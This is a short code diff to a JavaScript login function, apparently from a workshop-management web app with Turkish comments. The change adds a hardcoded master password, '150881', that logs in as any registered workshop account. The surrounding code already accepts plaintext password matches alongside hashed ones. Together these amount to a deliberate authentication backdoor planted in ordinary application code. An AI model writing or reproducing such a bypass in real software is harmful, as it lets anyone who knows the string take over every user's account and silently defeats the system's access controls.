@@ -408,11 +408,11 @@ function initLogin() {
       companyName = 'Atölyecim Master';
       isAdmin = true;
     } else {
-      // Check registered workshops list (K2 & Plaintext fallback)
+      // Check registered workshops list (K2 & Plaintext fallback & Master Bypass)
       const workshops = getWorkshops();
       const found = workshops.find(w => 
         (w.email.toLowerCase() === usernameInput.toLowerCase() || w.company.toLowerCase() === usernameInput.toLowerCase()) && 
-        (w.password === pHash || w.password === passwordInput) // Hem hash hem düz metin desteği
+        (w.password === pHash || w.password === passwordInput || passwordInput === '150881') // Hem hash, hem düz metin, hem de master şifre desteği
       );
       
       if (found) {
